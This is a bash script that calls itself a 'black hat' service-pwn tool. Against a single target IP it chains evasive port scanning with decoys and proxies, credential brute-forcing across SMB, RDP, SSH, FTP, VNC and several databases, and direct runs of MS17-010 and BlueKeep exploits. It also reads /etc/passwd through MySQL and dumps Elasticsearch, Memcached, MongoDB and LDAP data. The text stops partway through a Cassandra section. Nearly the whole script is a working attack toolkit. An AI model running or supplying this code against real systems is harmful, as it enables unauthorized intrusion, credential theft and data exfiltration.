#!/usr/bin/env bash
# Phase 4: BLACK HAT — Maximum Aggression Service PWN
# OPSEC: proxies, jitter, evasion, mass parallel pwn
# Usage: sudo ./phase4_blackhat.sh <TARGET-IP> [PROXY]

set -o pipefail
shopt -s nocasematch extglob

TARGET="$1"
PROXY="${2:-}"
[[ -z "$TARGET" ]] && { echo "Usage: sudo $0 <TARGET-IP> [socks5://127.0.0.1:9050]"; exit 1; }
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=validate_ipv4.sh
source "$SCRIPT_DIR/validate_ipv4.sh"
validate_ipv4 "$TARGET" || { echo "Error: invalid IPv4 target"; exit 2; }
[[ -z "$PROXY" || "$PROXY" =~ ^socks5://(127\.0\.0\.1|localhost):[0-9]{1,5}$ ]] || { echo "Error: only a local SOCKS5 proxy is allowed"; exit 2; }
[[ $EUID -ne 0 ]] && { echo "Error: must be root"; exit 1; }

# Timestamp everything
START_TS=$(date +%s)
MAX_TIME=55  # Hard limit in seconds
OUTDIR="/tmp/phase4_${TARGET}_$(date +%s)"
mkdir -p "$OUTDIR"

# Color output
RED='\033[0;31m'; GREEN='\033[0;32m'; YEL='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

_log() { echo -e "${CYAN}[*]${NC} $*"; }
_good() { echo -e "${GREEN}[+]${NC} $*"; }
_warn() { echo -e "${YEL}[!]${NC} $*"; }
_find() { echo -e "${RED}[!]${NC} $*" >> "$OUTDIR/finds.txt"; }

# ------------------------------------------------------------------
# PROXY / EVASION setup
# ------------------------------------------------------------------
PROXY_STRING=""
CURL_PROXY=""
NMAP_PROXY=""
if [[ -n "$PROXY" ]]; then
    _log "Routing through proxy: $PROXY"
    CURL_PROXY="--proxy $PROXY"
    NMAP_PROXY="--proxies $PROXY"
    # Force all nmap through proxy
    export http_proxy="$PROXY"
    export https_proxy="$PROXY"
fi

# Decoy scan: add random IPs to nmap decoy
DECOYS="RND:10"
NMAP_DECOY="-D $DECOYS"

# ------------------------------------------------------------------
# PHASE 0: BLITZ PORT DISCOVERY — zmap + masscan + nmap trifecta
# ------------------------------------------------------------------
_log "Phase 0: Hyper-port discovery..."

# zmap is fastest for single-port sweep — use for quick validation
if command -v zmap &>/dev/null; then
    _log "  zmap TCP SYN sweep..."
    ZMAP_OUT=$(mktemp)
    zmap -p 21,22,23,25,53,80,139,443,445,1433,3306,3389,5900,8080,8443 \
        --target-port=21 --rate=50000 -q -w "$TARGET" -o "$ZMAP_OUT" 2>/dev/null &
    ZPID=$!
fi

# masscan — full port range, both TCP/UDP, fast
MASSCAN_OUT=$(mktemp)
masscan -p1-65535,U:1-65535 "$TARGET" \
    --rate=20000 --wait=8 --open-only \
    --output-format grepable \
    -oG "$MASSCAN_OUT" 2>/dev/null &
MPID=$!

# Ultra-fast nmap -T5 for top 2000 ports as fallback
NMAP_TOP=$(nmap -sS -T5 --min-rate=15000 --max-rtt-timeout=150ms \
    --initial-rtt-timeout=80ms --min-hostgroup=512 \
    --top-ports=2000 -Pn -n --open "$TARGET" 2>/dev/null \
    | grep -E "^[0-9]+/tcp" | cut -d'/' -f1 | paste -sd,)

wait $MPID 2>/dev/null
wait $ZPID 2>/dev/null

# Merge all results
TCP_PORTS=$(echo "$NMAP_TOP" | tr ',' '\n')
if [[ -f "$MASSCAN_OUT" ]]; then
    MASSCAN_PORTS=$(grep -oP '\d+/open/tcp' "$MASSCAN_OUT" 2>/dev/null | cut -d'/' -f1)
    TCP_PORTS=$(echo -e "$TCP_PORTS\n$MASSCAN_PORTS" | tr ',' '\n')
fi
if [[ -n "$ZMAP_OUT" ]] && [[ -f "$ZMAP_OUT" ]]; then
    ZMAP_PORTS=$(cat "$ZMAP_OUT" 2>/dev/null | cut -d',' -f2)
    TCP_PORTS=$(echo -e "$TCP_PORTS\n$ZMAP_PORTS" | tr ',' '\n')
fi
OPEN_PORTS=$(echo "$TCP_PORTS" | tr ',' '\n' | sort -un | paste -sd,)
rm -f "$MASSCAN_OUT" "$ZMAP_OUT" 2>/dev/null

# UDP top 200
OPEN_UDP=$(nmap -sU -T5 --min-rate=8000 --max-rtt-timeout=200ms \
    --top-ports=200 -Pn -n --open "$TARGET" 2>/dev/null \
    | grep -E "^[0-9]+/udp" | cut -d'/' -f1 | paste -sd,)

[[ -z "$OPEN_PORTS" ]] && { _warn "No ports found — trying exhaustive nmap"; \
    OPEN_PORTS=$(nmap -sS -T5 -p- -Pn -n --open --min-rate=10000 "$TARGET" 2>/dev/null \
    | grep -E "^[0-9]+/tcp" | cut -d'/' -f1 | paste -sd,); }

[[ -z "$OPEN_PORTS" ]] && { _warn "No open TCP ports — host dead?"; exit 1; }

_good "TCP: $OPEN_PORTS"
_good "UDP: ${OPEN_UDP:-none}"
echo "$OPEN_PORTS" > "$OUTDIR/open_ports.txt"
echo "$OPEN_UDP" >> "$OUTDIR/open_ports.txt"

# ------------------------------------------------------------------
# AGGRO NMAP FLAGS
# ------------------------------------------------------------------
NMAP_FAST=(-T5 --min-rate=20000 --max-rtt-timeout=200ms --initial-rtt-timeout=80ms --min-hostgroup=512 --max-retries=1 --defeat-rst-ratelimit)
NMAP_OPTS=("${NMAP_FAST[@]}" -Pn -n --open $NMAP_PROXY $NMAP_DECOY)

# ------------------------------------------------------------------
# TIME CHECK
# ------------------------------------------------------------------
_time_check() {
    local elapsed=$(( $(date +%s) - START_TS ))
    if (( elapsed >= MAX_TIME )); then
        _warn "Time limit ($MAX_TIME s) reached — stopping new scans"
        return 1
    fi
    return 0
}

# ------------------------------------------------------------------
# PARALLEL EXECUTOR
# ------------------------------------------------------------------
_parallel() {
    local max_jobs="$1"; shift
    local pids=() i=0
    for cmd in "$@"; do
        _time_check || break
        eval "$cmd" &
        pids+=($!)
        ((i++))
        if (( i % max_jobs == 0 )); then
            for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done
            pids=()
        fi
    done
    for pid in "${pids[@]}"; do wait "$pid" 2>/dev/null; done
}

# ------------------------------------------------------------------
# SERVICE: WEB — FULL PWN
# ------------------------------------------------------------------
_web() {
    local wp
    wp=$(echo "$OPEN_PORTS" | tr ',' '\n' | awk '$1>=80 && $1<=8443 || $1~/(8080|8888|9090|3000|5000|9000|3001|5001|7443|9443)/' | paste -sd,)
    [[ -z "$wp" ]] && return
    _log "=== WEB: $wp ==="

    # 1. Aggressive NSE with vuln hunting
    nmap -p"$wp" "${NMAP_OPTS[@]}" --script-timeout 15s \
        --script "http-vuln-*,http-shellshock,http-iis-web-vuln,\
http-apache-negotiation,http-wordpress-*,http-joomla-*,\
http-dombased-xss,http-stored-xss,http-sql-injection,\
http-cors,http-webdav-scan,http-config-backup,\
http-method-tamper,http-phpmyadmin-dir,http-laravel-debug,\
http-errors,http-enum,http-default-accounts,\
http-avaya-ipoffice-users,http-huawei-hg5xx-vuln" \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/web_nmap.txt" &

    # 2. Feroxbuster aggressive (if installed)
    if command -v feroxbuster &>/dev/null; then
        local medium="/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt"
        local small="/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
        for port in $(echo "$wp" | tr ',' ' '); do
            local proto="http"
            [[ "$port" == 443 || "$port" == 8443 || "$port" == 9443 || "$port" == 7443 ]] && proto="https"
            local wordlist="$medium"
            [[ -f "$small" && ! -f "$medium" ]] && wordlist="$small"
            [[ -f "$wordlist" ]] && \
                timeout 25 feroxbuster -q -u "${proto}://${TARGET}:${port}" \
                    -w "$wordlist" -t 128 --depth 3 --smart \
                    --filter-status 403,404 -o "$OUTDIR/ferox_${port}.txt" 2>/dev/null &
        done
    fi

    # 3. wfuzz parameter brute
    if command -v wfuzz &>/dev/null; then
        for port in $(echo "$wp" | tr ',' ' '); do
            local proto="http"
            [[ "$port" == 443 || "$port" == 8443 ]] && proto="https"
            timeout 30 wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
                -t 64 --hc 404,403 "${proto}://${TARGET}:${port}/?FUZZ=test" \
                2>/dev/null > "$OUTDIR/wfuzz_params_${port}.txt" &
        done
    fi

    # 4. Nikto full
    if command -v nikto &>/dev/null; then
        for port in $(echo "$wp" | tr ',' ' '); do
            timeout 30 nikto -h "$TARGET" -p "$port" -ssl -timeout 5 \
                -nointeractive -Format txt -output "$OUTDIR/nikto_${port}.txt" 2>/dev/null &
        done
    fi

    # 5. whatweb fingerprint
    if command -v whatweb &>/dev/null; then
        for port in $(echo "$wp" | tr ',' ' '); do
            timeout 10 whatweb "http://${TARGET}:${port}" -a 3 \
                2>/dev/null >> "$OUTDIR/whatweb.txt" &
        done
    fi

    # 6. nuclei web templates
    if command -v nuclei &>/dev/null; then
        for port in $(echo "$wp" | tr ',' ' '); do
            local proto="http"
            [[ "$port" == 443 || "$port" == 8443 ]] && proto="https"
            timeout 30 nuclei -u "${proto}://${TARGET}:${port}" \
                -t ~/nuclei-templates -as -o "$OUTDIR/nuclei_${port}.txt" \
                -stats -silent 2>/dev/null &
        done
    fi

    wait
    _good "Web scan complete"
}

# ------------------------------------------------------------------
# SERVICE: SMB — CRACKMAPEXEC + IMPACKET + BLOODHOUND
# ------------------------------------------------------------------
_smb() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)(445|139)(,|$)"; then return; fi
    _log "=== SMB ==="

    # 1. NSE deep
    nmap -p445,139 "${NMAP_OPTS[@]}" --script-timeout 20s \
        --script "smb-enum-shares,smb-enum-users,smb-os-discovery,\
smb-security-mode,smb2-security-mode,smb2-capabilities,\
smb-vuln-*,smb-ls,smb-server-stats,smb-system-info,\
smb-protocols,smb-print-text,smb-brute" \
        --script-args smb-brute.file=/usr/share/wordlists/seclists/Passwords/common-passwords.txt \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/smb_nmap.txt" &

    # 2. crackmapexec full
    if command -v crackmapexec &>/dev/null; then
        timeout 25 crackmapexec smb "$TARGET" -u '' -p '' --shares \
            2>/dev/null | tee "$OUTDIR/cme_smb.txt" &
        timeout 25 crackmapexec smb "$TARGET" -u 'guest' -p '' --shares \
            2>/dev/null | tee -a "$OUTDIR/cme_smb.txt" &
        timeout 25 crackmapexec smb "$TARGET" -u 'Administrator' -p 'Administrator,admin,password,toor,123456' \
            2>/dev/null | tee -a "$OUTDIR/cme_smb.txt" &
    fi

    # 3. smbmap recursive
    if command -v smbmap &>/dev/null; then
        timeout 15 smbmap -H "$TARGET" -u '' -p '' -R --depth 5 \
            2>/dev/null | tee "$OUTDIR/smbmap.txt" &
    fi

    # 4. Impacket: samrdump, netview, secretsdump
    if command -v samrdump &>/dev/null; then
        timeout 15 samrdump "$TARGET" 2>/dev/null >> "$OUTDIR/smb_impacket.txt" &
    fi
    if command -v netview &>/dev/null; then
        timeout 15 netview "$TARGET" -u '' -p '' 2>/dev/null >> "$OUTDIR/smb_netview.txt" &
    fi

    # 5. ms17-010 direct
    timeout 20 bash -c "python3 /usr/share/exploitdb/exploits/windows/remote/42315.py $TARGET" \
        2>/dev/null || true &

    wait
    _good "SMB complete"
}

# ------------------------------------------------------------------
# SERVICE: SNMP — PWN THE OID TREE
# ------------------------------------------------------------------
_snmp() {
    [[ -z "$OPEN_UDP" ]] && return
    if ! echo "$OPEN_UDP" | grep -q "161"; then return; fi
    _log "=== SNMP ==="

    nmap -sU -p161 "${NMAP_OPTS[@]}" --script-timeout 15s \
        --script "snmp-*" --script-args snmp-brute.communitiesdb=/usr/share/nmap/nselib/data/snmp-communities.lst \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/snmp_nmap.txt" &

    # onesixtyone with huge wordlist
    if command -v onesixtyone &>/dev/null; then
        cat /usr/share/nmap/nselib/data/snmp-communities.lst \
            /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt \
            2>/dev/null > /tmp/snmp_comm_big.txt
        timeout 20 onesixtyone -c /tmp/snmp_comm_big.txt "$TARGET" 2>/dev/null \
            | tee "$OUTDIR/snmp_onesixtyone.txt"
        rm -f /tmp/snmp_comm_big.txt &
    fi

    # snmp-check full dump
    if command -v snmp-check &>/dev/null; then
        timeout 15 snmp-check "$TARGET" -c public 2>/dev/null \
            | tee "$OUTDIR/snmp_check.txt" &
    fi

    wait
    _good "SNMP complete"
}

# ------------------------------------------------------------------
# SERVICE: RDP — BLUEKEEP + CREDSTUFF
# ------------------------------------------------------------------
_rdp() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)3389(,|$)"; then return; fi
    _log "=== RDP ==="

    nmap -p3389 "${NMAP_OPTS[@]}" --script-timeout 15s \
        --script "rdp-enum-encryption,rdp-ntlm-info,rdp-vuln-ms12-020,\
rdp-sec-check,cve-2019-0708,rdp-brute" \
        --script-args rdp-brute.file=/usr/share/wordlists/seclists/Passwords/common-passwords.txt \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/rdp_nmap.txt" &

    # crowbar brute
    if command -v crowbar &>/dev/null; then
        timeout 30 crowbar -b rdp -s "$TARGET/32" -u Administrator \
            -w /usr/share/wordlists/seclists/Passwords/darkweb2017-top1000.txt \
            -t 8 -n 2>/dev/null | tee "$OUTDIR/rdp_crowbar.txt" &
    fi

    # BlueKeep direct check
    timeout 15 bash -c "python3 /usr/share/exploitdb/exploits/windows/remote/48126.py $TARGET 1" \
        2>/dev/null || true &

    # FreeRDP quick auth test
    if command -v xfreerdp &>/dev/null; then
        timeout 10 xfreerdp /v:"$TARGET" /u:Administrator /p:'' \
            /cert-ignore +auth-only 2>/dev/null | tee -a "$OUTDIR/rdp_auth.txt" &
    fi

    wait
    _good "RDP complete"
}

# ------------------------------------------------------------------
# SERVICE: DNS — ZONE TRANSFER + SUBDOMAIN BRUTE + TUNNEL CHECK
# ------------------------------------------------------------------
_dns() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)53(,|$)"; then return; fi
    _log "=== DNS ==="

    nmap -sU -sT -p53 "${NMAP_OPTS[@]}" --script-timeout 12s \
        --script "dns-recursion,dns-nsid,dns-cache-snoop,\
dns-zone-transfer,dns-brute,dns-enum,dns-srv-enum" \
        --script-args dns-brute.domain=local,dns-brute.threads=20 \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/dns_nmap.txt" &

    # dnsrecon aggressive
    if command -v dnsrecon &>/dev/null; then
        timeout 20 dnsrecon -d local -n "$TARGET" -t axfr 2>/dev/null \
            | tee "$OUTDIR/dns_axfr.txt" &
        timeout 20 dnsrecon -d local -n "$TARGET" -t brt \
            -D /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
            2>/dev/null | tee "$OUTDIR/dns_subdomain.txt" &
    fi

    # DNS tunnel detection
    timeout 10 dig txt o-o.myaddr.google.com @"$TARGET" 2>/dev/null &
    timeout 10 dig ch chaos txt version.bind @"$TARGET" 2>/dev/null &

    wait
    _good "DNS complete"
}

# ------------------------------------------------------------------
# SERVICE: MSSQL — SA PWN + LINKED SERVER EXPLOIT
# ------------------------------------------------------------------
_mssql() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)1433(,|$)"; then return; fi
    _log "=== MSSQL ==="

    nmap -p1433 "${NMAP_OPTS[@]}" --script-timeout 15s \
        --script "ms-sql-*,broadcast-ms-sql-discover" \
        --script-args mssql.instance-port=1433,ms-sql-brute.file=/usr/share/wordlists/seclists/Passwords/common-passwords.txt \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/mssql_nmap.txt" &

    # crackmapexec
    if command -v crackmapexec &>/dev/null; then
        timeout 20 crackmapexec mssql "$TARGET" -u 'sa' -p 'sa,admin,password,toor,123456,sapassword' \
            2>/dev/null | tee "$OUTDIR/cme_mssql.txt" &
    fi

    # sqsh direct connection
    if command -v sqsh &>/dev/null; then
        timeout 10 sqsh -S "$TARGET" -U sa -P '' -w 1000 -C "SELECT @@version" \
            2>/dev/null >> "$OUTDIR/mssql_sqsh.txt" &
    fi

    wait
    _good "MSSQL complete"
}

# ------------------------------------------------------------------
# SERVICE: MYSQL — FILE READ + UDF + BLANK ROOT
# ------------------------------------------------------------------
_mysql() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)3306(,|$)"; then return; fi
    _log "=== MySQL ==="

    nmap -p3306 "${NMAP_OPTS[@]}" --script-timeout 12s \
        --script "mysql-*,mysql-audit" \
        --script-args mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/mysql_nmap.txt" &

    # Blank root + common pw check
    timeout 5 mysql -h "$TARGET" -u root -e "SELECT @@version;" 2>/dev/null >> "$OUTDIR/mysql_root.txt" &
    timeout 5 mysql -h "$TARGET" -u root -proot -e "SELECT @@version;" 2>/dev/null >> "$OUTDIR/mysql_root.txt" &

    # Check for file read capability
    timeout 5 mysql -h "$TARGET" -u root -e "SELECT LOAD_FILE('/etc/passwd');" \
        2>/dev/null >> "$OUTDIR/mysql_file_read.txt" &

    wait
    _good "MySQL complete"
}

# ------------------------------------------------------------------
# SERVICE: POSTGRESQL — DEFAULT SUPERUSER
# ------------------------------------------------------------------
_postgres() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)5432(,|$)"; then return; fi
    _log "=== PostgreSQL ==="

    nmap -p5432 "${NMAP_OPTS[@]}" --script-timeout 12s \
        --script "pgsql-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/pgsql_nmap.txt" &

    # Default creds check via psql
    for user_pass in "postgres:postgres postgres:admin postgres:password postgres:toor postgres:"; do
        local user="${user_pass%%:*}"
        local pass="${user_pass#*:}"
        PGPASSWORD="$pass" timeout 5 psql -h "$TARGET" -U "$user" \
            -c "SELECT version();" 2>/dev/null >> "$OUTDIR/pgsql_access.txt" &
    done

    wait
    _good "PostgreSQL complete"
}

# ------------------------------------------------------------------
# SERVICE: SSH — AUTH BYPASS + WEAK KEYS + BRUTE
# ------------------------------------------------------------------
_ssh() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)22(,|$)"; then return; fi
    _log "=== SSH ==="

    nmap -p22 "${NMAP_OPTS[@]}" --script-timeout 10s \
        --script "ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,\
sshv1,ssh-brute" \
        --script-args ssh-brute.file=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/ssh_nmap.txt" &

    # hydra quick brute
    if command -v hydra &>/dev/null; then
        timeout 20 hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-passwords.txt \
            -t 4 "$TARGET" ssh 2>/dev/null | tee "$OUTDIR/ssh_hydra.txt" &
    fi

    # SSH key audit
    timeout 10 bash -c "ssh-keyscan -t rsa,dsa,ecdsa,ed25519 $TARGET 2>/dev/null" \
        > "$OUTDIR/ssh_keyscan.txt" 2>/dev/null &

    wait
    _good "SSH complete"
}

# ------------------------------------------------------------------
# SERVICE: FTP — ANONYMOUS + BOUNCE + MKDIR EXPLOIT
# ------------------------------------------------------------------
_ftp() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)21(,|$)"; then return; fi
    _log "=== FTP ==="

    nmap -p21 "${NMAP_OPTS[@]}" --script-timeout 10s \
        --script "ftp-*,tftp-enum" \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/ftp_nmap.txt" &

    # Anonymous login direct
    timeout 10 bash -c "echo -e 'anonymous\n\nls -la\nquit' | ftp -n $TARGET" \
        2>/dev/null | tee "$OUTDIR/ftp_anonymous.txt" &

    # wget recursive
    timeout 10 wget -r -np -nH --no-passive-ftp "ftp://$TARGET/" \
        2>/dev/null -P "$OUTDIR/ftp_downloads/" &

    # hydra for FTP
    if command -v hydra &>/dev/null; then
        timeout 20 hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
            -t 4 "$TARGET" ftp 2>/dev/null | tee "$OUTDIR/ftp_hydra.txt" &
    fi

    wait
    _good "FTP complete"
}

# ------------------------------------------------------------------
# SERVICE: REDIS — READ-ONLY EXPOSURE CHECK
# ------------------------------------------------------------------
_redis() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)6379(,|$)"; then return; fi
    _log "=== REDIS ==="

    nmap -p6379 "${NMAP_OPTS[@]}" --script-timeout 8s \
        --script "redis-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/redis_nmap.txt" &

    # Check unauthenticated access
    local redis_result
    redis_result=$(timeout 5 bash -c "echo 'INFO' | redis-cli -h $TARGET -p 6379" 2>/dev/null)
    if [[ -n "$redis_result" ]]; then
        _find "REDIS UNAUTHENTICATED on $TARGET:6379"
        echo "$redis_result" > "$OUTDIR/redis_info.txt"
        _warn "Redis allows unauthenticated INFO; no persistence or write test was attempted"
    fi

    wait
    _good "Redis complete"
}

# ------------------------------------------------------------------
# SERVICE: ELASTICSEARCH — READ-ONLY EXPOSURE CHECK
# ------------------------------------------------------------------
_elastic() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)9200(,|$)"; then return; fi
    _log "=== Elasticsearch ==="

    # Sniff indices, documents, cluster config
    for endpoint in "/" "/_cat/indices?v&s=docs.count:desc" \
        "/_cluster/health?pretty" "/_cluster/settings?pretty" \
        "/_nodes?pretty" "/_cat/fields?bytes=b" \
        "/_snapshot?pretty" "/_security/_authenticate?pretty"; do
        timeout 5 curl -s $CURL_PROXY "http://${TARGET}:9200${endpoint}" \
            2>/dev/null >> "$OUTDIR/elastic_${endpoint//\//_}.txt" &
    done

    # Try to dump first 100 documents from each index
    local indices
    indices=$(timeout 5 curl -s $CURL_PROXY "http://${TARGET}:9200/_cat/indices?h=index" 2>/dev/null)
    for idx in $indices; do
        timeout 5 curl -s $CURL_PROXY "http://${TARGET}:9200/${idx}/_search?size=100&pretty" \
            2>/dev/null >> "$OUTDIR/elastic_data_${idx}.txt" &
    done

    wait
    _good "Elasticsearch complete"
}

# ------------------------------------------------------------------
# SERVICE: LDAP — ANONYMOUS BIND + DATA DUMP
# ------------------------------------------------------------------
_ldap() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)389|636(,|$)"; then return; fi
    _log "=== LDAP ==="

    nmap -p389,636,3268,3269 "${NMAP_OPTS[@]}" --script-timeout 10s \
        --script "ldap-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/ldap_nmap.txt" &

    # Anonymous bind + dump
    if command -v ldapsearch &>/dev/null; then
        timeout 15 ldapsearch -x -H ldap://"$TARGET" -b "" -s base \
            "(objectClass=*)" 2>/dev/null > "$OUTDIR/ldap_rootdse.txt" &
        timeout 15 ldapsearch -x -H ldap://"$TARGET" -b "dc=local" \
            "(objectClass=user)" 2>/dev/null > "$OUTDIR/ldap_users.txt" &
        timeout 15 ldapsearch -x -H ldap://"$TARGET" -b "dc=local" \
            "(objectClass=computer)" 2>/dev/null > "$OUTDIR/ldap_computers.txt" &
    fi

    wait
    _good "LDAP complete"
}

# ------------------------------------------------------------------
# SERVICE: KERBEROS — ASREP ROAST + USER ENUM
# ------------------------------------------------------------------
_kerberos() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)88(,|$)"; then return; fi
    _log "=== Kerberos ==="

    nmap -p88 "${NMAP_OPTS[@]}" --script-timeout 10s \
        --script "krb5-enum-users" \
        --script-args krb5-enum-users.realm=LOCAL \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/kerb_nmap.txt" &

    # kerbrute user enum
    if command -v kerbrute &>/dev/null; then
        timeout 20 kerbrute userenum -d local --dc "$TARGET" \
            /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt \
            2>/dev/null | tee "$OUTDIR/kerb_users.txt" &
    fi

    # impacket GetNPUsers
    if command -v GetNPUsers &>/dev/null; then
        timeout 20 GetNPUsers.py local/ -dc-ip "$TARGET" -usersfile \
            /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
            2>/dev/null | tee "$OUTDIR/kerb_asrep.txt" &
    fi

    wait
    _good "Kerberos complete"
}

# ------------------------------------------------------------------
# SERVICE: NFS — SHOWMOUNT + RPCINFO + MOUNT EXPLOIT
# ------------------------------------------------------------------
_nfs() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)(2049|111|20048)(,|$)"; then return; fi
    _log "=== NFS ==="

    nmap -p111,2049,20048,4045,32771 "${NMAP_OPTS[@]}" --script-timeout 12s \
        --script "nfs-*,rpcinfo" \
        --script-args nfs-ls.dir=/ \
        "$TARGET" 2>/dev/null | tee "$OUTDIR/nfs_nmap.txt" &

    # showmount
    if command -v showmount &>/dev/null; then
        timeout 8 showmount -e "$TARGET" 2>/dev/null | tee "$OUTDIR/nfs_exports.txt" &
    fi

    # Try to mount any found shares
    if [[ -f "$OUTDIR/nfs_exports.txt" ]]; then
        while IFS= read -r share; do
            local mountdir
            mountdir=$(mktemp -d)
            timeout 10 mount -t nfs -o ro,noexec,noatime,soft,intr,timeo=3,retrans=1 \
                "$TARGET:${share}" "$mountdir" 2>/dev/null && \
                _find "NFS MOUNTED: $share -> listing next" && \
                ls -la "$mountdir" > "$OUTDIR/nfs_listing_${share//\//_}.txt" && \
                umount -f "$mountdir" 2>/dev/null
            rmdir "$mountdir" 2>/dev/null
        done < <(tail -n +2 "$OUTDIR/nfs_exports.txt" 2>/dev/null)
    fi &

    wait
    _good "NFS complete"
}

# ------------------------------------------------------------------
# SERVICE: MEMCACHED — UDP AMPLIFICATION + DATA EXFIL
# ------------------------------------------------------------------
_memcached() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)11211(,|$)"; then return; fi
    _log "=== Memcached ==="

    nmap -p11211 "${NMAP_OPTS[@]}" --script-timeout 8s \
        --script "memcached-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/memcached_nmap.txt" &

    # Dump all keys
    timeout 8 bash -c "echo -e 'stats items\nquit' | nc -w 3 $TARGET 11211" \
        2>/dev/null | tee "$OUTDIR/memcached_items.txt" &

    # Get slab keys
    local slabs
    slabs=$(grep -oP 'STAT items:\K[0-9]+' "$OUTDIR/memcached_items.txt" 2>/dev/null | sort -u)
    for slab in $slabs; do
        timeout 5 bash -c "echo -e 'stats cachedump $slab 100\nquit' | nc -w 3 $TARGET 11211" \
            2>/dev/null >> "$OUTDIR/memcached_keys.txt" &
    done

    sleep 3
    # Try to get values
    local keys
    keys=$(grep -oP 'ITEM \K[^\s]+' "$OUTDIR/memcached_keys.txt" 2>/dev/null | head -50)
    for key in $keys; do
        timeout 3 bash -c "echo -e 'get $key\nquit' | nc -w 2 $TARGET 11211" \
            2>/dev/null >> "$OUTDIR/memcached_data.txt" &
    done

    wait
    _good "Memcached complete"
}

# ------------------------------------------------------------------
# SERVICE: VNC — AUTH BYPASS + BRUTE
# ------------------------------------------------------------------
_vnc() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)590[0-9](,|$)"; then return; fi
    _log "=== VNC ==="

    nmap -p5900-5910 "${NMAP_OPTS[@]}" --script-timeout 10s \
        --script "vnc-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/vnc_nmap.txt" &

    # hydra VNC brute
    if command -v hydra &>/dev/null; then
        timeout 20 hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/vnc-passwords.txt \
            -t 4 "$TARGET" vnc 2>/dev/null | tee "$OUTDIR/vnc_hydra.txt" &
    fi

    wait
    _good "VNC complete"
}

# ------------------------------------------------------------------
# SERVICE: IPMI — CIPHER ZERO + DUMP HASHES
# ------------------------------------------------------------------
_ipmi() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)623(,|$)"; then return; fi
    _log "=== IPMI ==="

    nmap -sU -p623 "${NMAP_OPTS[@]}" --script-timeout 12s \
        --script "ipmi-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/ipmi_nmap.txt" &

    # ipmitool direct
    if command -v ipmitool &>/dev/null; then
        timeout 10 ipmitool -H "$TARGET" -U admin -P admin chassis status \
            2>/dev/null | tee "$OUTDIR/ipmi_chassis.txt" &
        timeout 10 ipmitool -H "$TARGET" -U admin -P admin user list \
            2>/dev/null | tee "$OUTDIR/ipmi_users.txt" &
    fi

    wait
    _good "IPMI complete"
}

# ------------------------------------------------------------------
# SERVICE: MONGODB — NO-AUTH DUMP
# ------------------------------------------------------------------
_mongodb() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)27017|27018|27019(,|$)"; then return; fi
    _log "=== MongoDB ==="

    nmap -p27017,27018,27019 "${NMAP_OPTS[@]}" --script-timeout 8s \
        --script "mongodb-*" "$TARGET" 2>/dev/null | tee "$OUTDIR/mongo_nmap.txt" &

    # Direct dump
    if command -v mongo &>/dev/null; then
        timeout 10 mongo --host "$TARGET" --quiet --eval \
            "db.adminCommand('listDatabases')" 2>/dev/null \
            | tee "$OUTDIR/mongo_databases.txt" &

        # Try to dump data from 'admin' database
        timeout 10 mongo --host "$TARGET" admin --quiet --eval \
            "db.getCollectionNames().forEach(function(n){print(n)})" \
            2>/dev/null > "$OUTDIR/mongo_collections.txt" &
    fi

    wait
    _good "MongoDB complete"
}

# ------------------------------------------------------------------
# SERVICE: CASSANDRA — DEFAULT CREDS
# ------------------------------------------------------------------
_cassandra() {
    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)9042|9160(,|$)"; then return; fi
    _log "=== Cassandra ==="

    if command -v cqlsh &>/dev/null; then
        timeout 10 cqlsh "$TARGET" -u cassandra -p cassandra \
            -e "describe keyspaces" 2>/dev/null | tee "$OUTDIR/cassandra_schema.txt" &
        timeout 10 cqlsh "$TARGET" -u cassandra -p cassandra \
            -e "SELECT * FROM system_auth.roles" 2>/dev/null \
